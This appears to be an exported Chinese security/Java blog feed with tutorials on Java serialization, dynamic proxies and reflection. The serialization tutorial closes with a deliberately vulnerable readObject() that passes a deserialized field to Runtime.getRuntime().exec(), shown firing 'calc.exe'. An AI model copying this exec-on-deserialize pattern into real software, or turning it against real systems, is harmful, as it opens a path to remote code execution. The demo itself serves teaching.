    <content type="text"><![CDATA[这里主要讲解Java序列化及反序列化机制。 何为序列化Java 提供了一种对象序列化的机制：一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。整个过程都是JVM独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 序列化：把对象转换为字节序列的过程。 反序列化：把字节序列恢复为对象的过程。 为何设计序列化1、可以弥补不同操作系统之间的差异，如Windows上创建的对象进行序列化后通过网络传到Linux上可直接反序列化得到该对象而无需担心数据在不同机器、系统上的表示会不同； 2、对Java的远程方法调用RMI是必需的。RMI是为了使得存在于其他主机上的对象使用起来像本机上的对象一样，当向远程对象发送信息时，需要通过对象序列化来传输参数和返回值； 3、对Java Bean是必需的。使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，然而这种状态信息需要保存下来，并在程序启动时进行后期恢复，这时是靠反序列化机制来完成的； 4、方便保存对象信息以便于下次JVM启动时可以直接使用。 序列化的条件一个类对象要想实现序列化，必须满足两个条件： 1、该类必须实现 java.io.Serializable 对象。 2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 如何序列化要序列化一个对象，首先要创建OutputStream对象，再将其封装在一个ObjectOutputStream对象内，接着只需调用writeObject()即可将对象序列化，并将其发送给OutputStream（对象是基于字节的，因此要使用InputStream和OutputStream来继承层次结构）。 要反序列化出一个对象，需要将一个InputStream封装在ObjectInputStream内，然后调用readObject()即可。 ObjectInputStream/ObjectOutputStream类 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外即writeObject()，其用来序列化一个对象，并将它发送到输出流： 1public final void writeObject(Object x) throws IOException 同样的，ObjectInputStream类包含反序列化一个对象的方法readObject()，其用于从流中取出下一个对象，并将对象反序列化，它的返回值为Object，因此需要将它转换成合适的数据类型： 1public final Object readObject() throws IOException, ClassNotFoundException Demo 定义一个User类，继承Serializable接口，其中address字段设置transient关键字： 1234567891011import java.io.Serializable;public class User implements Serializable &#123; public String name; public transient String address; public int number; public void info()&#123; System.out.println("Name: " + name + "\nAddress: " + address + "\nNumber: " + number); &#125;&#125; 编写一个进行序列化操作的类： 123456789101112131415161718192021222324252627import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; serialize_test(); &#125;&#125; 运行后查看输出，给该User对象赋值成功并保存到了目标文件中： 用WinHex打开user.ser文件查看： 在刚刚的test.class中添加反序列化操作的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("[*]反序列化后的内容："); user.info(); &#125; public static void main(String[] args) &#123;// serialize_test(); unserialize_test(); &#125;&#125; 注意，readObject()方法中的try/catch代码块尝试捕获 ClassNotFoundException 异常。对于JVM可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个ClassNotFoundException异常。 查看反序列化结果： 可以看到反序列化出来的对象，除了Address属性外其余的属性值都成功地反序列化出来了得到几乎和序列化之前一样的对象。这里Address属性是因为设置了transient关键字，具体的原理在下面会讲解。 serialVersionUIDserialVersionUID即序列化的版本号，适用于Java的序列化机制。简单来说，Java的序列化机制是通过判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。 具体的序列化过程是这样的：序列化操作的时候系统会把当前类的serialVersionUID写入到序列化文件中，当反序列化时系统会去检测文件中的serialVersionUID，判断它是否与当前类的serialVersionUID一致，如果一致就说明序列化类的版本与当前类版本是一样的，可以反序列化成功，否则失败。 serialVersionUID有两种显示的生成方式： 一是默认的1L，比如：private static final long serialVersionUID = 1L； 二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段，比如： 1private static final long serialVersionUID = xxxxL; 当一个类实现了Serializable接口，如果没有显示的定义serialVersionUID，Eclipse会提供相应的提醒。面对这种情况，我们只需要在Eclipse中点击类中warning图标一下，Eclipse就会自动给定两种生成的方式。如果不想定义，在Eclipse的设置中也可以把它关掉的，设置如下： Window ==&gt; Preferences ==&gt; Java ==&gt; Compiler ==&gt; Error/Warnings ==&gt; Potential programming problems将Serializable class without serialVersionUID的warning改成ignore即可。 当实现java.io.Serializable接口的类没有显式地定义一个serialVersionUID变量时候，Java序列化机制会根据编译的Class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，如果Class文件(类名，方法明等)没有发生变化(增加空格，换行，增加注释等等)，就算再编译多次，serialVersionUID也不会变化的。 显式地定义serialVersionUID有两种用途： 1、 在某些场合，希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有相同的serialVersionUID； 2、 在某些场合，不希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有不同的serialVersionUID。 序列化的控制在某些情况下，我们可能需要对序列化的过程进行控制，比如说不需要哪些部分被反序列化等，这时可通过Externalizable接口替代Serializable接口来实现对序列化过程的控制。 1、Externalizable Externalizable接口继承了Serializable接口，同时添加了两个方法即writeExternal()和readExternal()，两者会在序列化和反序列化的过程中被自动调用，以便于执行一些特殊操作来实现过程控制。 2、transient关键字 当我们对序列化进行控制时，可能有些特殊子对象不想让Java的序列化机制自动保存和恢复，比如说子对象表示的是敏感信息。即使对象中的这些信息是private属性，但经过序列化处理后人们就可以通过读取文件或拦截数据报文来非法获取该信息。 这时存在两个方法。一是通过将类实现为前面的Externalizable，这时无任何东西可以自动序列化，并且可在writeExternal()内部只对所需部分进行显式的序列化；二是当我们正在操作的是一个Serializable对象，则所有序列化操作会自动执行，这时就可应用到transient（瞬时）关键字来逐个字段地关闭序列化，即说明指定字段内容在序列化中是不需要保存或恢复操作的。 由于Externalizable对象在默认情况下不保存它们的任何字段，所以transient关键字只能和Serializable对象一起使用。 3、自己实现Serializable 若非十分坚定地使用Externalizable接口，那么还可以自己实现Serializable接口，并添加writeObject()和readObject()方法，一旦对象被序列化和反序列化还原，就会自动地分别调用这两个方法。值得注意的是，这里说的是“添加”而非“覆盖”或“实现”，也就是说，只要我们提供了这两个方法，程序就会使用这两个方法而非默认的序列化机制。 这些方法必须具有准确的方法特征签名： 123private void writeObject(ObjectOutputStream stream) throws IOExceptionprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException 注意，这些方法被定义成了private。 在调用ObjectOutputStream.writeObject()时，会检查所传递的Serializable对象，看看是否实现了自己的writeObject()，若实现了，则跳过正常的序列化过程并调用自己实现的writeObject()。readObject()方法的情形类似。 序列化的二进制格式看回刚才用WinHex打开的序列化Demo生成的user.ser文件： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 00 05：STREAM_VERSION，序列化协议版本。 0x73：TC_OBJECT，声明这是一个新的对象。 0x72：TC_CLASSDESC，声明这里开始一个新Class。 00 04：Class名字的长度，这里Class名为User，长度为4。 55 73 65 72：类名称User。 64 D4 C4 D2 26 CA C4 8D：SerialVersionUID，序列化ID，如果没有指定，则会由算法随机生成一个8byte的ID。 0x02：标记号，该值声明该对象支持序列化。 00 02：该类所包含的域个数。 0x49：域类型，49 代表”I”，也就是Int。 00 06：域名字的长度，该域名为number、长度为6。 6E 75 6D 62 65 72：域名字描述，这里为number。 0x4C：域的类型，4C代表String。 00 04：域名字的长度，该域名为name、长度为4。 6E 61 6D 65：域名字描述，这里为name。 0x74：TC_STRING，代表一个new String，用String来引用对象。 00 12：该String长度，这里String为“Ljava/lang/String;”、长度为0x12. 4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B：JVM的标准对象签名表示法，这里是指String为“Ljava/lang/String;”。 0x78：TC_ENDBLOCKDATA，对象数据块结束的标志。 0x70：TC_NULL，说明没有其他超类的标志。 00 00 02 9A：这个暂时不知道，各位大佬知道的麻烦指点一下 ：) 0x74：TC_STRING，代表一个new String，用String来引用对象。 00 07：域名字的长度，该域名为Mi1k7ea、长度为7。 4D 69 31 6B 37 65 61：域名字描述，这里为“Mi1k7ea”。 自定义实现序列化如前面序列化的控制中的自己实现Serializable所说，可以添加writeObject()和readObject()这两个方法，它们并不属于任何的类和接口，只要在要序列化的类中提供这两个方法，就会在序列化机制中自动被调用。 自定义实现的好处是：程序员可以更加精细或者说可以去定制自己想要实现的序列化，如下面例子中将name和address变量值反转。利用这种特点，可以在序列化过程中对一些敏感信息做特殊的处理。 User.class：添加了private关键字的writeObject()和readObject()两个方法 123456789101112131415161718192021222324import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println("[*]Write Object."); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println("[*]Read Object."); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); &#125;&#125; test.class： 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("Name: " + user.name + "\nAddress: " + user.address + "\nNumber: " + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); &#125;&#125; 运行查看，确实是经过自己编写的writeObject()和readObject()两个方法来实现序列化和反序列化操作的： what’s more！——反序列化漏洞点 Java反序列化漏洞点通常在于自定义实现的readObject()方法的代码逻辑存在缺陷，导致可能会触发反序列化漏洞。 其实这和PHP反序列化漏洞原理差不多，PHP中是魔法函数若存在缺陷代码则可能会存在反序列化漏洞风险，这类似于Java中自定义实现的readObject()函数。 下面的例子只在前面的例子中添加if语句中的Runtime.getRuntime().exec()： User.class： 12345678910111213141516171819202122232425262728import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println("[*]Write Object."); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println("[*]Read Object."); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); //加了个判断，当数字为666时，进入缺陷代码逻辑块 if (this.number == 666)&#123; Runtime.getRuntime().exec(name); &#125; &#125;&#125; test.class 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); //将name字段值修改为calc命令 user.name = "calc.exe"; user.address = "England"; //将number值设置为满足if判断条件的666值 user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]User对象已经序列化保存到user.ser文件中"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("Name: " + user.name + "\nAddress: " + user.address + "\nNumber: " + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); &#125;&#125; 运行代码，查看到readObject()中的不安全代码块中执行了命令： 参考深入理解JAVA I/O系列五：对象序列化 Java 序列化 java类中serialversionuid 作用 是什么?举个例子说明]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java动态代理机制]]></title>
    <url>%2F2019%2F02%2F01%2FJava%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Java动态代理机制主要通过反射机制来实现的，下面讲解一下动态代理相关内容。 代理模式代理模式是Java中常用的设计模式，主要由公共接口、被代理类和代理类等三部分组成，代理类持有被代理类的实类，代为执行具体的类方法。其中代理类与被代理类有同样的接口。 代理类与被代理类之间通常会存在关联关系，一个代理类的对象与一个被代理类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用被代理类对象的方法来提供特定的服务。 代理模式结构图 使用代理模式的场景 (1)、设计模式中有一个设计原则是开闭原则，指修改关闭对扩展开放，当需要看非本人所写的代码时，通常很难直接修改代码，那么这时就可以通过代理对类进行增强。 (2)、在使用RPC框架时，框架本身并不能提前知道各个业务方要调用哪些接口的哪些方法 。那么这时就可通过动态代理的方式来建立一个中间人给客户端使用，也方便框架进行搭建逻辑，某种程度上也是客户端代码和框架松耦合的一种表现。 (3)、Spring的AOP机制就是采用动态代理的机制来实现切面编程。 静态代理与动态代理 根据加载被代理类的时机不同，将代理分为静态代理和动态代理。 如果在代码编译时就确定了被代理的类是哪一个，那么就可以直接使用静态代理；如果不能确定，那么可以使用类的动态加载机制，在代码运行期间加载被代理的类，这就是动态代理，比如RPC框架和Spring AOP机制。 静态代理静态代理：在代码编译时就确定了具体的被代理类。由程序员创建或特定工具自动生成源代码，也就是在编译时就已经将接口、被代理类、代理类等确定下来。在程序运行之前，代理类的.class文件就已经生成。 Demo示例 其中被代理类已经明确的在代理类代码中写出，在代码编译时就能确定出该被代理类，从而实现静态代理： 123456789101112131415161718192021222324252627public class test &#123; public static void consumer(ProxyInterface pi)&#123; pi.echo(); &#125; public static void main(String[] args) throws Exception&#123; consumer(new ProxyObject()); &#125;&#125;interface ProxyInterface &#123; void echo();&#125;class RealObject implements ProxyInterface &#123; public void echo()&#123; System.out.println("This is RealObject."); &#125;&#125;class ProxyObject implements ProxyInterface&#123; public void echo()&#123; System.out.println("AOP"); new RealObject().echo(); System.out.println("Write Log"); &#125;&#125; 可以看到，代理类ProxyObject在执行被代理类RealObject的方法前后都能够方便地添加新的功能如Spring的面向切面编程AOP，且是通过调用被代理类的方法来实现调用的而非代理类自己直接调用的： 动态代理基本概念在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。 注意，JDK提供的代理只能针对接口做代理。 下面来看下实现动态代理机制的Proxy类和InvocationHandler接口。 InvocationHandler接口每一个动态代理类都必须要实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler，当代理类对象调用一个方法的时候，这个方法的调用就会被转发为由InvocationHandler这个接口的 invoke ()方法来进行调用。 作为InvocationHandler接口唯一的方法，invoke ()方法定义如下： 1Object invoke(Object proxy, Method method, Object[] args) throws Throwable proxy参数：指代被代理类对象即真实对象； method参数：指代的是所要调用被代理类对象的某个方法的Method对象； args参数：指代的是调用被代理类对象某个方法时接受的参数； Proxy类Proxy这个类的作用就是用来动态创建一个代理对象类，它提供了许多的方法，其中用的最多的就是 newProxyInstance ()方法： 1public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException 这个方法的作用就是得到一个动态的代理类对象，其中接收三个参数： loader参数：一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理类对象进行加载； interfaces参数：一个Interface接口对象数组，说明将要给被代理类对象提供一组什么样的接口，如果提供了一组接口给被代理类对象，那么该对象就宣称实现了该接口(多态)，这样就能调用这组接口中的方法了； h参数：一个InvocationHandler对象，表示的是当这个动态代理对象在调用方法的时候，会关联到哪一个InvocationHandler对象上； 创建动态代理对象的具体步骤1、创建一个InvocationHandler对象 12//创建一个与代理对象相关联的InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu); 2、使用Proxy类的getProxyClass静态方法生成一个动态代理类stuProxyClass 1Class&lt;?&gt; stuProxyClass = Proxy.getProxyClass(Person.class.getClassLoader(), new Class&lt;?&gt;[] &#123;Person.class&#125;); 3、获得stuProxyClass 中一个带InvocationHandler参数的构造器constructor 1Constructor&lt;?&gt; constructor = PersonProxy.getConstructor(InvocationHandler.class); 4、通过构造器constructor来创建一个动态实例stuProxy 1Person stuProxy = (Person) cons.newInstance(stuHandler); 当然，上面四个步骤可以通过Proxy类的newProxyInstances()方法来简化： 1234//创建一个与代理对象相关联的InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu);//创建一个代理对象stuProxy，代理对象的每个执行方法都会替换执行Invocation中的invoke方法Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Person.class&#125;, stuHandler); Demo示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class test &#123; public static void main(String[] args) &#123; //创建一个被代理类的对象 Subject realSubject = new RealSubject(); //通过实现InvacationHandler接口，将被代理类对象传入handler InvocationHandler handler = new DynamicProxy(realSubject); /* * 通过Proxy的newProxyInstance方法来创建代理类对象，来看看其三个参数 * 第一个参数 handler.getClass().getClassLoader() ，我们这里使用handler这个类的ClassLoader对象来加载我们的代理对象 * 第二个参数realSubject.getClass().getInterfaces()，我们这里为代理对象提供的接口是真实对象所实行的接口，表示我要代理的是该真实对象，这样我就能调用这组接口中的方法了 * 第三个参数handler， 我们这里将这个代理对象关联到了上方的 InvocationHandler 这个对象上 */ Subject subject = (Subject)Proxy.newProxyInstance(handler.getClass().getClassLoader(), realSubject.getClass().getInterfaces(), handler); System.out.println(subject.getClass().getName()); subject.send(); subject.recv(); &#125;&#125;interface Subject &#123; public void send(); public void recv();&#125;class RealSubject implements Subject &#123; public void send()&#123; System.out.println("[*]Send"); &#125; public void recv()&#123; System.out.println("[*]Recv"); &#125;&#125;class DynamicProxy implements InvocationHandler &#123; //要代理的被代理类对象 private Object subject; //构造方法，给被代理类对象赋初始值 DynamicProxy(Object subject)&#123; this.subject = subject; &#125; public Object invoke(Object object, Method method, Object[] args) throws Throwable&#123; //在代理真实对象前可以添加一些功能操作 System.out.println("AOP"); System.out.println("Method: " + method); //当代理类对象调用被代理类对象的方法时，其会自动跳转到代理类对象关联的handler对象的invoke()方法来进行调用 method.invoke(subject, args); //在代理真实对象后也可以添加一些功能操作 System.out.println("Write Logs"); return null; &#125;&#125; 再次提醒，JDK提供的代理只能是针对接口做代理，也就是说调用newProxyInstance()返创建代理类对象时回的必须要是一个接口。 观察输出内容： 第一行内容：”com.sun.proxy.\$Proxy0”是由 System.out.println(subject.getClass().getName()); 这条语句打印出来的，我们一般会以为返回的这个代理对象会是Subject类型的对象或者是InvocationHandler的对象，然并非，原因在newProxyInstance()方法的第二个参数上，该参数给代理类对象提供了一组接口，而该对象就会实现这组接口，这时可将这个对象强制类型转化为这组接口中的任意一个，因为这里的接口是Subject类型，所以就可以将其转化为Subject类型了。另外，通过 Proxy.newProxyInstance()创建的代理对象是在JVM运行时动态生成的一个对象，并非是InvocationHandler类型，也不是定义的那组接口的类型，而是在运行时动态生成的一个对象，并且命名方式都是以$开头、Proxy为中、最后为数字（表示对象的标号）的形式。 第二行至第五行内容（后面4行内容是类似的）：”AOP”和”Write Logs”为代理过程中新添加的输出功能；中间的”[*]Send”为代理类对象调用关联的handler中的invoke()方法来执行真实的被代理类的方法；”Method：”输出的是handler中invoke()方法method参数的值，这里可看到为”public abstract void Subject.send()”，说明该方法是来自真实的被代理类对象的接口方法，也就是说，并非是代理类对象直接调用目标方法，而是通过由其关联到的handler对象的invoke()方法中来调用，从而实现代理的方式调用。 同时因为在代码编译时并不知道被代理的类是哪个，因此实现了动态代理的方式。 原理分析查看Proxy类的newProxyInstance()函数的实现代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@CallerSensitive public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException &#123; Objects.requireNonNull(h); final Class&lt;?&gt;[] intfs = interfaces.clone(); final SecurityManager sm = System.getSecurityManager(); if (sm != null) &#123; checkProxyAccess(Reflection.getCallerClass(), loader, intfs); &#125; /* * Look up or generate the designated proxy class. */ Class&lt;?&gt; cl = getProxyClass0(loader, intfs); /* * Invoke its constructor with the designated invocation handler. */ try &#123; if (sm != null) &#123; checkNewProxyPermission(Reflection.getCallerClass(), cl); &#125; final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams); final InvocationHandler ih = h; if (!Modifier.isPublic(cl.getModifiers())) &#123; AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; cons.setAccessible(true); return null; &#125; &#125;); &#125; return cons.newInstance(new Object[]&#123;h&#125;); &#125; catch (IllegalAccessException|InstantiationException e) &#123; throw new InternalError(e.toString(), e); &#125; catch (InvocationTargetException e) &#123; Throwable t = e.getCause(); if (t instanceof RuntimeException) &#123; throw (RuntimeException) t; &#125; else &#123; throw new InternalError(t.toString(), t); &#125; &#125; catch (NoSuchMethodException e) &#123; throw new InternalError(e.toString(), e); &#125; &#125; 可以发现只是封装了创建动态代理类的步骤。 重点关注”Class&lt;?&gt; cl = getProxyClass0(loader, intfs);”，其用于产生代理类，后面代码中的构造器也是通过这里产生的类来获得，因此可看出这个类的产生就是整个动态代理的关键。 JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。 小结可以将InvocationHandler接口类看做一个中介类，中介类持有一个被代理对象即真实对象，在invoke()方法中调用了被代理对象相应的方法。通过聚合方式持有被代理对象的引用，把外部对invoke的调用最终都转为对被代理对象的调用。 代理类调用自己方法时，通过自身持有的中介类对象来调用中介类对象的invoke方法，从而达到代理执行被代理对象的方法。也就是说，动态代理通过中介类实现了具体的代理功能。 参考java动态代理实现与原理详细分析 java的动态代理机制详解 Java动态代理与反射详解]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反射机制]]></title>
    <url>%2F2019%2F02%2F01%2FJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[基本概念反射机制定义：Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 通俗点讲，通过反射，该类对我们来说是完全透明的，想要获取任何东西都可以。 要使用反射机制，就必须要先获取到该类的字节码文件对象(.class)，通过字节码文件对象，就能够通过该类中的方法获取到我们想要的所有信息(方法，属性，类名，父类名，实现的所有接口等等)，每一个类对应着一个字节码文件也就对应着一个Class类型的对象，也就是字节码文件对象。 反射机制相关类库在Java中，Class类和java.lang.reflect类库一起构成了对反射机制的支持。其中最常使用到的类是Constructor，Field，Method，而这三个类都继承了一个接口java.lang.reflect.Member。下面列举介绍一下java.lang.reflect类库中的类： AccessibleObject：Field，Method，和Constructor对象的基类。提供了将反射的对象标记为在使用时取消默认Java语言访问控制检查的能力。 Array：提供了动态创建和访问Java数组的方法。 Constructor：提供关于类的单个构造方法的信息以及对它的访问权限。 Field： 提供有关类或接口的单个字段的信息，以及对它的动态访问权限。反射的字段可能是一个类（静态）字段或实例字段。 Method： 提供关于类或接口上单独某个方法（以及如何访问该方法）的信息。所反映的方法可能是类方法或实例方法（包括抽象方法）。 Modifier： 类提供了 static 方法和常量，对类和成员访问修饰符进行解码。修饰符集被表示为整数，用不同的位位置 (bit position) 表示不同的修饰符。该类的字段均是int类型的变量。 Proxy： 提供用于创建动态代理类和实例的静态方法，它还是由这些方法创建的所有动态代理类的超类。 ReflectPermission：反射操作的 Permission 类。ReflectPermission 是一种指定权限，没有动作。当前定义的唯一名称是 suppressAccessChecks，它允许取消由反射对象在其使用点上执行的标准 Java 语言访问检查 - 对于 public、default（包）访问、protected、private 成员。 当要使用反射机制去探查一个类的内部时，还可以调用getFields()，getMethods()和getConstructors()等很便利的方法。对于反射机制，和RTTI（Run-Time Type Information，运行时类型信息）的区别就在于，RTTI是在编译时打开和检查.class文件，而反射机制是在运行时打开和检查.class文件。 获取类名称通过反射机制获取类名称有三种方法： 1、Class clz = Class.forName(“com.test.User”); 2、Class clz = com.test.User.class; 3、User u = new User(); Class clz = u.getClass(); Demo示例： 123456789101112131415161718192021public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz1 = Class.forName("java.lang.Runtime"); System.out.println("方法一："); System.out.println(clz1.getName()); &#125; catch (ClassNotFoundException e) &#123; System.out.println("forName出错"); &#125; Class clz2 = java.lang.ProcessBuilder.class; System.out.println("方法二："); System.out.println(clz2.getName()); java.lang.String s = ""; Class clz3 = s.getClass(); System.out.println("方法三："); System.out.println(clz3.getName()); &#125;&#125; 可从运行结果中看到分别获取了不同类名称： 创建对象通过Class创建对象： Class clz = Class.forName(“com.test.User”); User u = (User)clz.newInstane();//调用无参构造函数 Demo示例： Uset.class定义User类，包含用户名和年龄： 12345678910111213141516171819202122232425262728public class User &#123; private String name; private int age; @Override public String toString() &#123; return "User&#123;" + "name='" + name + '\'' + ", age=" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125;&#125; test.class中调用newInstane()创建对象： 123456789101112131415161718public class test &#123; public static void main(String[] args) &#123; Class clz = User.class; User user = null; try &#123; user = (User)clz.newInstance(); &#125; catch (InstantiationException e)&#123; e.printStackTrace(); &#125; catch (IllegalAccessException e)&#123; e.printStackTrace(); &#125; user.setName("Mi1k7ea"); user.setAge(6); System.out.println(user); &#125;&#125; 从结果可看到创建了新的User类对象并成功赋值： 获取类对象属性这里的属性指的是类定义的组成元素，如修饰符、方法名、成员变量等。 获取所有的属性： Class clz = Class.forName(“com.test.User”); Field [] fields = clz.getDeclaredFields(); 获取特定属性： Class clz = Class.forName(“com.test.User”); Field [] fields = clz.getDeclaredField(“xxx”);//xxx为指定属性名 Demo示例： 1234567891011121314151617181920212223242526272829import java.lang.reflect.Field;public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz = Class.forName("User"); User user = (User)clz.newInstance(); Field[] fields = clz.getDeclaredFields(); System.out.println("User类所有的属性："); for (Field f : fields) &#123; System.out.println(f); &#125; Field field = clz.getDeclaredField("name"); field.setAccessible(true); field.set(user, "Mi1k7ea"); System.out.println("\n修改的User类对象的name值为："); System.out.println(field.get(user)); System.out.println("修改属性后的User类对象："); System.out.println(user); &#125; catch (ClassNotFoundException e) &#123; System.out.println("forName出错"); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 可从结果看到调用获取了getDeclaredFields()所有Runtime类的属性，包括修饰符、方法名、成员变量等，同时也调用getDeclaredField()获取了指定的属性： 应用示例1、利用反射，在泛型为int的arryaList集合中存放一个String类型的对象原理：集合中的泛型只在编译器有效，而到了运行期时泛型则会失效。 1234567891011121314151617import java.lang.reflect.Method;import java.util.ArrayList;import java.util.List;public class test &#123; public static void main(String[] args) throws Exception&#123; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); list.add(1); list.add(2);// list.add("Mi1k7ea");//在编译器中泛型生效，插入字符串对象会报错 Class clz = list.getClass(); Method method = clz.getMethod("add", Object.class); method.invoke(list, "Mi1k7ea"); System.out.println(list); &#125;&#125; 